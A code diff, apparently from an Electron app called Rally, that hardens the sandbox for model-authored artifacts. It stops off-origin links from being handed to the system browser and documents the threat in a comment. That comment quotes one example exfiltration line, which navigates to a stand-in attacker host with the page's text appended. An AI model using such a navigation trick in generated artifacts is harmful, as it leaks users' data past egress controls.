@@ -136,11 +136,21 @@ export function artifactWebPreferences(artifactId: string, packaged: boolean) {
 /**
  * Lock a web contents to one artifact's origin, and deny everything else.
  *
- * Applied to both surfaces from one place. Navigation away is refused rather
- * than followed, `window.open` opens in the system browser instead of a Rally
- * window that would inherit this session, and every permission request is
- * denied outright — an artifact has no business asking for a camera, and a
- * prompt that appears to come from Rally is worse than one that never appears.
+ * Applied to both surfaces from one place. Navigation away is refused, every
+ * permission request is denied outright — an artifact has no business asking
+ * for a camera, and a prompt that appears to come from Rally is worse than one
+ * that never appears — and **nothing the page composes is handed to the system
+ * browser**.
+ *
+ * That last one is a reversal worth stating. Opening an off-origin link
+ * externally reads as helpful, and it is how a normal embedded view behaves.
+ * But artifact code is model-authored and can put whatever it likes in a URL:
+ * `location = "https://attacker.example/?" + document.body.innerText` is a
+ * navigation, not a `fetch`, so the CSP's `connect-src` and `form-action` do
+ * not touch it — and handing that URL to the person's browser is Rally
+ * *performing* the exfiltration the egress fence exists to prevent. A link a
+ * person actually wants to follow is a cost paid to close that; they can copy
+ * it out of the page.
  */
 export function confineToArtifactOrigin(
   contents: {
@@ -149,20 +159,12 @@ export function confineToArtifactOrigin(
     session: Pick<Session, 'setPermissionRequestHandler'>;
   },
   origin: string,
-  openExternally: (url: string) => void,
 ): void {
   contents.on('will-navigate', (event, url) => {
     if (sameOrigin(url, origin)) return;
     event.preventDefault();
-    // A link out of an artifact goes to the person's browser rather than
-    // nowhere: refusing silently reads as a broken page, and following it would
-    // put an arbitrary site inside a Rally surface.
-    if (isSafeExternal(url)) openExternally(url);
   });
-  contents.setWindowOpenHandler(({ url }) => {
-    if (isSafeExternal(url)) openExternally(url);
-    return { action: 'deny' };
-  });
+  contents.setWindowOpenHandler(() => ({ action: 'deny' }));
   contents.session.setPermissionRequestHandler((_contents, _permission, callback) => {
     callback(false);
   });
@@ -176,15 +178,6 @@ function sameOrigin(candidate: string, origin: string): boolean {
   }
 }
 
-/** Only schemes a browser is the right home for. Never `file:` or a custom one. */
-function isSafeExternal(candidate: string): boolean {
-  try {
-    const { protocol } = new URL(candidate);
-    return protocol === 'https:' || protocol === 'http:' || protocol === 'mailto:';
-  } catch {
-    return false;
-  }
-}
 
 /**
  * The rail's live preview: one view per window, composited over a fixed pane.
